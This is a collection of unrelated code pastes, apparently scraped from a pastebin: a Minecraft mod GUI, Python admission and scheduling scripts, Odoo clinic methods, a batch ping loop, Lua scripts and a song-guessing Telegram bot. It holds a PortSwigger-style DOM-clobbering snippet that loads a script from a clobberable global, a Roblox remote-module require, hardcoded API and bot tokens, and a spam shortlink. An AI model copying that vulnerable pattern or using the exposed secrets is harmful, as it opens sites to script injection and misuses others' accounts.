        incVertAngleButton = new ExtendedButton(this.leftPos + 23, increaseHeightButton.getY() + increaseHeightButton.getHeight() + 2,
                32, 16, Component.translatable(""button.thingamajigs.laser_light.height_inc""),
                (b0s) -> {
                    PacketDistributor.SERVER.noArg().send(new DJLaserLightUpdatePayload(
                            new BlockPos(x,y,z),
                            djllbe.useCustomColor,djllbe.randomlyGenerateColor,
                            djllbe.height,djllbe.color,
                            djllbe.angle,djllbe.verticalAngle + 1,
                            djllbe.oscAngle,djllbe.degreeOfMotionMultiplier,
                            djllbe.laserSize,
                            djllbe.red,
                            djllbe.green,
                            djllbe.blue,
                            djllbe.lightMode
                    ));
                    Minecraft.getInstance().getSoundManager().play(SimpleSoundInstance.forUI(SoundEvents.ITEM_PICKUP,1.0F));
                });

        redSlider = new ExtendedSlider(this.leftPos + 11,this.topPos + 88,32,16,
                Component.literal(""Red Value: ""),Component.literal(redSlider.getValueString()),
                0.0,1.0,1.0,0.1,1,true)
        {
            @Override
            protected void applyValue() {
                float redVal = (float)redSlider.getValue();

                PacketDistributor.SERVER.noArg().send(new DJLaserLightUpdatePayload(
                        new BlockPos(x,y,z),
                        djllbe.useCustomColor,djllbe.randomlyGenerateColor,
                        djllbe.height,djllbe.color,
                        djllbe.angle,djllbe.verticalAngle,
                        djllbe.oscAngle,djllbe.degreeOfMotionMultiplier,
                        djllbe.laserSize,
                        redVal,
                        djllbe.green,
                        djllbe.blue,
                        djllbe.lightMode
                ));
            }
        };

    }
}
"
xNf2q65L,Untitled,Oppaceted,Python,Thursday 22nd of February 2024 04:20:58 PM CDT,"from random import randint, choice
from names_generator import names

class Abiturient:
    def __init__(self, ID: int) -> None:
        self.ID = ID
        self.name = choice(names)
    
class Teacher:
    def __init__(self, allAbiturients: list ) -> None:
        #self.Abiturient = Abiturient
        self.allAbiturients = allAbiturients

    def testAbiturients(self):
        dictAbiturients = {}
        for element in self.allAbiturients:
            dictAbiturients[randint(0, 100)] = element
        return dictAbiturients

class Faculty:
    def __init__(self, name: str, maxNumberOfStudents: int):
        self.name = name
        self.maxNumberOfStudents = maxNumberOfStudents

    def returnPassedAbiturients(self, dictAbiturients: dict) -> list:
        return sorted(dictAbiturients.keys(), reverse=True)[:self.maxNumberOfStudents:]"
BTSmiWxX,Untitled,Oppaceted,Python,Thursday 22nd of February 2024 04:20:02 PM CDT,"names = [
    ""Александр"",
    ""Алексей"",
    ""Андрей"",
    ""Анатолий"",
    ""Антон"",
    ""Артём"",
    ""Артур"",
    ""Богдан"",
    ""Борис"",
    ""Вадим"",
    ""Валентин"",
    ""Василий"",
    ""Георгий"",
    ""Глеб"",
    ""Григорий"",
    ""Даниил"",
    ""Денис"",
    ""Дмитрий"",
    ""Евгений"",
    ""Егор"",
    ""Иван"",
    ""Игорь"",
    ""Илья"",
    ""Кирилл"",
    ""Константин"",
    ""Лев"",
    ""Леонид"",
    ""Максим"",
    ""Матвей"",
    ""Олег"",
    ""Николай"",
    ""Всеволод"",
    ""Михаил"",
    ""Юрий""
]
"
tFP8D7zN,Untitled,Oppaceted,Python,Thursday 22nd of February 2024 04:19:24 PM CDT,"from classes import *

N = int(input(""Введите количество студентов: ""))
allAbiturients = []

for i in range(N):
    allAbiturients.append(Abiturient(i))

teacher = Teacher(allAbiturients=allAbiturients)
dictAbiturients = teacher.testAbiturients()

faculty = Faculty(name=""МПУ"", maxNumberOfStudents=12)

i = 1
for element in faculty.returnPassedAbiturients(dictAbiturients=dictAbiturients):
    print(f""{i:>2}) {dictAbiturients.get(element).name:<11}--{element:>3} --|"")
    i += 1
print(f""Проходной балл: {faculty.returnPassedAbiturients(dictAbiturients=dictAbiturients)[::-1][0]}"")"
Kg57792D,Batch checking internet,rerere284,Batch,Thursday 22nd of February 2024 04:16:28 PM CDT,"@echo off

:promptUser
set /p choice=""Do you want to check DNS (nslookup) or perform a continuous ping (ping)? (n/p): ""
if /i ""%choice%""==""n"" goto checkDNS
if /i ""%choice%""==""p"" goto pingLoop
echo Invalid option. Please enter 'n' for nslookup or 'p' for ping.
timeout /t 2 /nobreak >nul
goto promptUser

:checkDNS
echo Checking DNS...
nslookup www.microsoft.com
timeout /t 4 /nobreak >nul
goto checkDNS

:pingLoop
echo Performing continuous ping to www.microsoft.com...
:ping
ping -n 2 www.microsoft.com
timeout /t 4 /nobreak >nul
goto ping

pause >NUL
"
tXrc346d,StarfS,robinmollen,Lua,Thursday 22nd of February 2024 04:13:05 PM CDT,"require(16453916639).RAroblox(""YourNameHere"")"
GyTJCdFD,merging inherited list wpf,bobmarley12345,C#,Thursday 22nd of February 2024 04:04:17 PM CDT,"//
// Copyright (c) 2023-2024 REghZy
//
// This file is part of FramePFX.
//
// FramePFX is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either
// version 3.0 of the License, or (at your option) any later version.
//
// FramePFX is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
// Lesser General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with FramePFX. If not, see <https://www.gnu.org/licenses/>.
//

using System.Collections.Generic;
using System.Diagnostics;
using System.Windows;
using System.Windows.Data;
using FramePFX.Utils;

namespace FramePFX.Interactivity.Contexts {
    /// <summary>
    /// A class that is used to extract contextual information from WPF components
    /// </summary>
    public static class DataManager {
        // public static readonly RoutedEvent ClickEvent = EventManager.RegisterRoutedEvent(""Click"", RoutingStrategy.Bubble, typeof (RoutedEventHandler), typeof (ButtonBase));

        /// <summary>
        /// The context data property, used to store contextual information relative to a specific dependency object
        /// </summary>
        public static readonly DependencyProperty ContextDataProperty = DependencyProperty.RegisterAttached(""ContextData"", typeof(ContextData), typeof(DataManager), new PropertyMetadata(null, OnDataContextChanged));
        private static readonly DependencyPropertyKey InheritedContextDataPropertyKey = DependencyProperty.RegisterAttachedReadOnly(""InheritedContextData"", typeof(ContextData), typeof(DataManager), new FrameworkPropertyMetadata(null, FrameworkPropertyMetadataOptions.Inherits, OnInheritedDataContextChanged, OnCoerceInheritedContextData));

        private static readonly DependencyProperty IsUpdatingLocalInheritedContextProperty = DependencyProperty.RegisterAttached(""IsUpdatingLocalInheritedContext"", typeof(bool), typeof(DataManager), new PropertyMetadata(BoolBox.False));

        private static void SetIsUpdatingLocalInheritedContext(DependencyObject element, bool value) => element.SetValue(IsUpdatingLocalInheritedContextProperty, value.Box());
        private static bool GetIsUpdatingLocalInheritedContext(DependencyObject element) => (bool) element.GetValue(IsUpdatingLocalInheritedContextProperty);

        /// <summary>
        /// A property used to store the merged accumulation of all available context data from the visual tree for a specific element
        /// </summary>
        public static readonly DependencyProperty InheritedContextDataProperty = InheritedContextDataPropertyKey.DependencyProperty;

        public static IContextData GetInheritedContextData(DependencyObject element) {
            return (IContextData) element.GetValue(InheritedContextDataProperty);
        }

        private static void OnDataContextChanged(DependencyObject element, DependencyPropertyChangedEventArgs e) {
            // UpdateInheritedContextOnContextChanged(d, e.NewValue as ContextData);
            // SetIsUpdatingLocalInheritedContext(element, true);
            if (e.NewValue == null) {
                element.ClearValue(InheritedContextDataPropertyKey);
            }
            else {
                ContextData data = (ContextData) e.NewValue;
                DependencyObject parent = VisualTreeUtils.GetParent(element);
                if (parent?.GetValue(InheritedContextDataProperty) is ContextData parentData) {
                    data = ContextData.Merge(parentData, data);
                }

                element.SetValue(InheritedContextDataPropertyKey, data);
            }

            // SetIsUpdatingLocalInheritedContext(element, false);
        }

        private static object OnCoerceInheritedContextData(DependencyObject element, object value) {
            if (GetIsUpdatingLocalInheritedContext(element)) {
                return value;
            }

            CompositeCollection er;

            object localObject = element.ReadLocalValue(ContextDataProperty);
            if (localObject == DependencyProperty.UnsetValue || !(localObject is ContextData localData) || localData.Count < 1) {
                return value;
            }

            DependencyObject parent = VisualTreeUtils.GetParent(element);
            if (parent?.GetValue(InheritedContextDataProperty) is ContextData parentData) {
                value = value is ContextData valueCtx ? ContextData.Merge(parentData, valueCtx) : parentData;
            }

            return value;
        }

        private static void OnInheritedDataContextChanged(DependencyObject element, DependencyPropertyChangedEventArgs e) {
            if (GetIsUpdatingLocalInheritedContext(element)) {
                return;
            }

            Debug.WriteLine(""ee"");

            // ContextData parentData = GetInheritedContextFromParents(target);
            // if (newData == null) {
            //     newData = parentData;
            // }
            // else if (parentData != null) {
            //     newData = ContextData.Merge(parentData, newData);
            // }
            // target.SetValue(InheritedContextDataPropertyKey, newData);
            // UpdateChildrenInheritedContext(target, newData);
        }

        /// <summary>
        /// Sets or replaces the context data for the specific dependency object
        /// </summary>
        public static void SetContextData(DependencyObject element, ContextData value) {
            element.SetValue(ContextDataProperty, value);
        }

        /// <summary>
        /// Gets the context data for the specific dependency object
        /// </summary>
        public static ContextData GetContextData(DependencyObject element) {
            return (ContextData) element.GetValue(ContextDataProperty);
        }

        /// <summary>
        /// Clears the <see cref=""ContextDataProperty""/> value for the specific dependency object
        /// </summary>
        public static void ClearContextData(DependencyObject element) {
            element.ClearValue(ContextDataProperty);
        }

        // private static readonly PropertyInfo TreeLevelPropertyInfo = typeof(Visual).GetProperty(""TreeLevel"", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.DeclaredOnly) ?? throw new Exception(""Could not find TreeLevel property"");

        /// <summary>
        /// Does bottom-to-top scan of the element's visual tree, and then accumulates and merged all of the data keys
        /// associated with each object from top to bottom, ensuring the bottom of the visual tree has the most power
        /// over the final data context key values
        /// </summary>
        /// <param name=""obj""></param>
        /// <returns></returns>
        public static ContextData EvaluateContextData(DependencyObject obj) {
            ContextData ctx = new ContextData();

            // I thought about using TreeLevel, then thought reflection was too slow, so then I profiled the code...
            // This entire method (for a clip, 26 visual elements to the root) takes about 20 microseconds
            // Using the TreeLevel trick adds about 10 microseconds on top of it

            // int initialSize = 0;
            // if (obj is UIElement element && element.IsArrangeValid)
            //     initialSize = (int) (uint) TreeLevelPropertyInfo.GetValue(element);
            // if (initialSize < 1)
            //     initialSize = 32;

            // Accumulate visual tree bottom-to-top. Visual tree will contain the reverse tree
            List<DependencyObject> visualTree = new List<DependencyObject>(32);
            for (DependencyObject dp = obj; dp != null; dp = VisualTreeUtils.GetParent(dp)) {
                visualTree.Add(dp);
            }

            // Scan top-down in order to allow deeper objects' entries to override higher up entries
            for (int i = visualTree.Count - 1; i >= 0; i--) {
                DependencyObject dp = visualTree[i];
                object localEntry = dp.ReadLocalValue(ContextDataProperty);
                if (localEntry != DependencyProperty.UnsetValue && localEntry is IContextData dpCtx) {
                    ctx.Merge(dpCtx);
                }
            }

            return ctx;
        }

        // private static ContextData GetInheritedContextFromParents(DependencyObject target) {
        //     for (DependencyObject parent = VisualTreeUtils.GetParent(target); parent != null; parent = VisualTreeUtils.GetParent(parent)) {
        //         if (target.GetValue(InheritedContextDataProperty) is ContextData parentData) {
        //             return parentData;
        //         }
        //     }
        //     return null;
        // }
        // private static void UpdateInheritedContextOnContextChanged(DependencyObject target, ContextData newData) {
        //     ContextData parentData = GetInheritedContextFromParents(target);
        //     if (newData == null) {
        //         newData = parentData;
        //     }
        //     else if (parentData != null) {
        //         newData = ContextData.Merge(parentData, newData);
        //     }
        //     target.SetValue(InheritedContextDataPropertyKey, newData);
        //     UpdateChildrenInheritedContext(target, newData);
        // }
        // private static void UpdateChildrenInheritedContext(DependencyObject parent, ContextData parentData) {
        //     int count = VisualTreeHelper.GetChildrenCount(parent);
        //     for (int i = 0; i < count; i++) {
        //         DependencyObject child = VisualTreeHelper.GetChild(parent, i);
        //         ContextData childData = child.GetValue(ContextDataProperty) as ContextData;
        //         if (childData == null) {
        //             childData = parentData;
        //         }
        //         else if (parentData != null) {
        //             childData = ContextData.Merge(parentData, childData);
        //         }
        //         child.SetValue(InheritedContextDataPropertyKey, childData);
        //         UpdateChildrenInheritedContext(child, childData);
        //     }
        // }
        public static void UpdateInheritedContext(DependencyObject element) {
            element.CoerceValue(InheritedContextDataProperty);
        }
    }
}"
jgVsWTQX,Untitled,den4ik2003,Python,Thursday 22nd of February 2024 04:04:09 PM CDT,"import os
import random
import pandas as pd
import asyncio

import lyricsgenius as lg
import pickle as pkl
import wordcloud
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.types import Message, FSInputFile
from aiogram.enums import ParseMode
from aiogram import F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup


class UserContext(StatesGroup):
    is_guessed = State()
    is_true = State()


id = 'Ve-cqnQoF0XkGOoV5Bd7ffVXIi9S38GbEwpwKCB98A-GrGPI1_qkn3EgCq5aaDKX'
secret = 'zIXKeKxY2DEQ7_Vyn7uOF1okwGX4JUYRor-KRmHGxuZpZrMY_hKwWf6GxB2j-ub4itvJB7oZCjcrTnwg3vPZTA'
access_token = 'F--CA-E5kwN2nCHZzGgxZ6pwFufhXsnwd4YiFLdWXsyJJOd6JT6MeXD2_vSuzOX_'

bot = Bot(token='7130759964:AAF8l9aX9zeCvQLFAtN_yzVVo7Nu-Ws_Zzs')
dp = Dispatcher()

data = pd.read_csv('data.csv')
genius = lg.Genius(access_token, skip_non_songs=True, remove_section_headers=True)


async def check_answer(guess, actual_name, artist):
    async_search = asyncio.to_thread(genius.search_song, guess)
    guess_search = await async_search

    if guess_search is not None:
        if guess_search.title == actual_name:
            return True
        else:
            async_search = asyncio.to_thread(genius.search_song, guess, artist)
            guess_search = await async_search

            if guess_search is not None:
                return guess_search.title == actual_name
            else:
                return False
            
    return False


with open ('vectorizer.pkl', 'rb') as f:
    vectorizer = pkl.load(f)


def create_wordcloud(song):
    vecs = vectorizer.transform([song['lyrics']])
    dense = vecs.todense()
    lst1 = dense.tolist()
    df = pd.DataFrame(lst1, columns=vectorizer.get_feature_names_out())
    cloud = wordcloud.WordCloud(max_font_size=80, max_words=100, background_color=""white"").fit_words({word: freq for word, freq in zip(df.columns, df.loc[0])})
    return cloud


def generate_trial(data):
    idx = random.randint(0, len(data) - 1)
    song = data.loc[idx]
    cloud = create_wordcloud(song)
    params = {'title': song['title'],
              'artist': song['artist'],
              'url': song['url'],
              'index_in_data': idx
             }
    if song['album'] is not None:
        params['album'] = song['album']
    return cloud, params



@dp.message(StateFilter(None), Command('play'))
async def send_play(message: Message, state: FSMContext):
    cloud, params = generate_trial(data)
    img_path = 'img/{0}.png'.format(params['index_in_data'])

    if not os.path.exists(img_path):
        cloud.to_file(img_path)
    
    await message.answer_photo(
        FSInputFile(img_path),
        caption=""Угадай название трека и напиши его""
    )

    await state.update_data(guessed_song=params['title'])
    await state.update_data(song_artist=params['artist'])
    await state.update_data(song_url=params['url'])

    await state.set_state(UserContext.is_guessed)
    ctx = await state.get_data()
    print(ctx)

# TODO: маршрутизатор
# async def hint(message: Message, state: FSMContext):
#     ctx = await state.get_data()
#     message.answer('Подсказка!\n Исполнитель: {0}'.format(ctx['song_artist']))


@dp.message(UserContext.is_guessed)  # F.text
async def guess_song(message: Message, state: FSMContext):
    ctx = await state.get_data()

    if await check_answer(message.text, ctx['guessed_song'], ctx['song_artist']):
        await message.answer('Ты угадал! Это {0} - {1}\nПослушай: {2}'.format(ctx['guessed_song'], ctx['song_artist'], ctx['song_url']))
    else:
        await message.answer('Тебя постигла неудача, правильный ответ: {0} - {1}\nПослушай: {2}'.format(ctx['guessed_song'], ctx['song_artist'], ctx['song_url']))

    await state.clear()


@dp.message(Command('start'))
async def send_welcome(message: Message):
    welcome_text = (
        ""<b>Тебя приветсвует Угадай Трек бот!</b>\n""
        ""Тебе будут показаны наиболее часто встречающиеся в песне слова, а ты должен будешь отгадать название трека.\n\n""
        ""<b>Команды:</b>\n""
        ""/start - Начать взаимодействие с ботом.\n""
        ""/play - Играть.\n""
        ""/help - Показать список доступных команд.\n""
        ""/stats - Посмотреть процент угаданных треков.\n\n""
        ""Удачи тебе иии... Погнали!""
    )

    kb = [[types.KeyboardButton(text='Играть!')]]

    keyboard = types.ReplyKeyboardMarkup(
        keyboard=kb,
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.reply(welcome_text, parse_mode=ParseMode.HTML, reply_markup=keyboard)


async def help(message: Message):
    help_text = (
        ""Потерялся? Сейчас помогу!\n\n""
        ""<b>Команды:</b>\n""
        ""/start - Начать взаимодействие с ботом.\n""
        ""/play - Играть.\n""
        ""/stats - Посмотреть процент угаданных треков.""
    )

    await message.reply(help_text, parse_mode=ParseMode.HTML)


dp.message.register(help, Command('help'))


@dp.message(StateFilter(None), F.text)
async def unknown_message(message: Message, state: FSMContext):
    if message.text == 'Играть!':
        await send_play(message, state)
    else:
        await help(message)


async def main():
    await dp.start_polling(bot)


if __name__ == ""__main__"":
    asyncio.run(main())
"
E0U8XpCj,Untitled,sissou123,CSS,Thursday 22nd of February 2024 03:50:34 PM CDT,"Tailwind CSS 3 | Learn By Building Multiple Projects A-Z
In this course you learn A-Z Tailwind CSS 3 Basic Fundamental Then Build one Blog Project and Ecommerce Project 
What you'll learn
Tailwind CSS 3.0
Install and configure the ideal environment for working with Tailwind CSS
How to customise Tailwind 
for more:https://cuty.io/lVhlOc5ym8R8
"
gvbvMguQ,portswigger_DomClobb_enableXSS,turtle_bear_bravo,JavaScript,Thursday 22nd of February 2024 03:42:52 PM CDT,"<script>
    window.onload = function(){
        let someObject = window.user-comments || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>"
5dEJDQtq,ak-cdu-alarm,akiradoe,Lua,Thursday 22nd of February 2024 03:25:29 PM CDT,"while true do
local detector = peripheral.find(""playerDetector"")
local playerList = detector.getPlayersInRange(25)
 
if detector == nil then
    error(""playerDetector not in range"")
end

count = 0
for _ in pairs(playerList) do count = count + 1 end
 
if(count == 0) then 
    redstone.setOutput(""right"", false)
end
 
for k,v in pairs(playerList) do
    if(v ~= ""Akirad0e"")
        then redstone.setOutput(""right"", true)
        end 
    end 
end"
NB2juqpH,Untitled,Kabor_42,Python,Thursday 22nd of February 2024 03:04:46 PM CDT,"import time
from typing import Callable, List, Tuple, Any
import random
import more_itertools
import humanize
from datetime import timedelta


def generate(N: int, H: int) -> List[Tuple[int, int]]:
    return list(
        map(
            lambda l: (l, random.randint(l, H)),
            more_itertools.repeatfunc(random.randint, N, 1, H),
        )
    )


def find_non_overlapping(
    intervals: List[Tuple[int, int]], workers: int
) -> List[List[Tuple[int, int]]]:
    intervals.sort(key=lambda x: x[0])  # Sort by starting point
    worker_assignments = [[] for _ in range(workers)]
    worker_intervals_count = [0] * workers

    for interval in intervals:
        min_worker = None
        min_intervals_assigned = float(""inf"")
        for i in range(workers):
            if worker_assignments[i]:
                last_interval = worker_assignments[i][-1]
                if interval[0] > last_interval[1]:
                    intervals_assigned = worker_intervals_count[i]
                    if intervals_assigned < min_intervals_assigned:
                        min_intervals_assigned = intervals_assigned
                        min_worker = i
            else:
                min_worker = i
                break

        if min_worker is not None:
            worker_assignments[min_worker].append(interval)
            worker_intervals_count[min_worker] += 1

    return worker_assignments


def time_overlap():
    # N = random.randint(1, 1_000_000)
    # H = random.randint(1, 1_000_000)
    N, H = 1_000_000, 1_000_000
    intervals = generate(N, H)

    find_non_overlapping(intervals, 2)


def measure_time(f: Callable) -> Tuple[timedelta, Any]:
    t1 = time.perf_counter()
    result = f()
    t2 = time.perf_counter()
    return timedelta(seconds=t2 - t1), result


def main():
    t, _ = measure_time(time_overlap)
    print(f""{humanize.precisedelta(t, minimum_unit='microseconds')}"")


if __name__ == ""__main__"":
    main()
"
4ui5srqL,Untitled,JMOREY1030,Python,Thursday 22nd of February 2024 02:45:24 PM CDT," @api.model_create_multi
    def create(self, vals_list):
        # Validate producto required
        for vals in vals_list:
            if vals.get('service_type_id', False):
                service_type_ids = self.env['clinical.service'].browse(
                    [vals.get('service_type_id')]).clinical_service_rate_ids

                if vals.get('service_ids', False):
                    service_type_line_ids = [id for id in vals['service_ids'][0][2]]
                    for serv in service_type_ids:
                        if serv.id not in service_type_line_ids:
                            if serv.service_id.delete_ok == True:
                                raise ValidationError(
                                    ""El producto {} es requerido para el servicio,no puede ser eliminado."".format(
                                        serv.service_id.display_name))
                else:
                    vals.update({
                        'service_ids': [(6, 0, service_type_ids.ids)]
                    })

            vals['state_id'] = self.env.ref('clinic_base.appointment_state_scheduled').id
            vals['appointment_sequence'] = self.env['ir.sequence'].next_by_code(
                'clinical.appointment.sequence') or 'New'

        # val = super(ClinicalAppointment, self).create(vals_list)
        appointments = super(ClinicalAppointment, self).create(vals_list)

        event_list = []
        for appointment in appointments:
            self.check_availability(appointment.date_start, appointment.hr_id)

            appointment.partner_id.write({
                'clinical_history_ids': [(0, 0, {
                    'appointment_id': appointment.id
                })]
            })

            self.create_service_used_tools(appointment)
            self.create_urlappointment_portal(appointment)
            # Esto se realizo porq ahora las citas se crean en estado realizado por defecto y al momento de crear la cita se debe crear el link para los acuerdos
            if appointment.agreement_ids:
                appointment.token_deals, appointment.url_deals = self.createUrlDocuments()
                agreements = []
                for agreement in appointment.agreement_ids:
                    value = {
                        'appointment_id': appointment.id,
                        'agreement_id': agreement.id,
                        'partner_id': appointment.partner_id.id,
                        'token_deals': appointment.token_deals,
                        'url_deals': appointment.url_deals,
                    }
                    agreements.append(value)
                if agreements:
                    self.env['clinical.partner.agreement'].create(agreements)

            if appointment.recurrent:
                appointment.process_recurrent_create()
            if not self._context.get('event', False):
                event_list.append(appointment._create_events())
        if event_list:
            self.env['calendar.event'].with_context(appointment=True).create(event_list)
        return appointments"
zkShDSmL,Untitled,JMOREY1030,Python,Thursday 22nd of February 2024 02:30:59 PM CDT,"    @api.model_create_multi
    def create(self, vals_list):
        # created_appointments = self.env['clinical.appointment']
        created_appointments = []  # Lista para almacenar todas las citas creadas

        for vals in vals_list:
            if vals.get('service_type_id', False):
                service_type_ids = self.env['clinical.service'].browse(
                    [vals.get('service_type_id')]).clinical_service_rate_ids

                if vals.get('service_ids', False):
                    service_type_line_ids = [id for id in vals['service_ids'][0][2]]
                    for serv in service_type_ids:
                        if serv.id not in service_type_line_ids:
                            if serv.service_id.delete_ok == True:
                                raise ValidationError(
                                    ""El producto {} es requerido para el servicio, no puede ser eliminado."".format(
                                        serv.service_id.display_name))
                else:
                    vals.update({
                        'service_ids': [(6, 0, service_type_ids.ids)]
                    })

            vals['state_id'] = self.env.ref('clinic_base.appointment_state_scheduled').id
            vals['appointment_sequence'] = self.env['ir.sequence'].next_by_code(
                'clinical.appointment.sequence') or 'New'

            # Set partner_id from the first patient in the list if it's not set
            if not vals.get('partner_id') and vals.get('patient_ids'):
                vals['partner_id'] = vals['patient_ids'][0][2][0]

            # Create individual appointments for patients in a group appointment
            if vals.get('add_group') and vals.get('patient_ids'):
                for patient_id in vals['patient_ids'][0][2]:
                    patient_vals = vals.copy()
                    patient_vals.update({
                        'add_group': False,
                        'patient_ids': [(6, 0, [patient_id])],
                        'partner_id': patient_id,
                        # ... (mantener los demás campos actualizados)
                    })
                    # Eliminar el valor 'state_id' antes de crear la cita individual
                    del patient_vals['state_id']
                    patient_appointment = self.create(
                        patient_vals)  # Utilizar self.create para crear citas individuales
                    created_appointments.append(patient_appointment)

                    # Eliminar el valor 'add_group' y 'state_id' de la cita grupal original
                del vals['add_group']
                del vals['state_id']

            # Crear la cita grupal
            group_appointment = super(ClinicalAppointment, self).create(vals)
            created_appointments.append(group_appointment)

        return created_appointments"
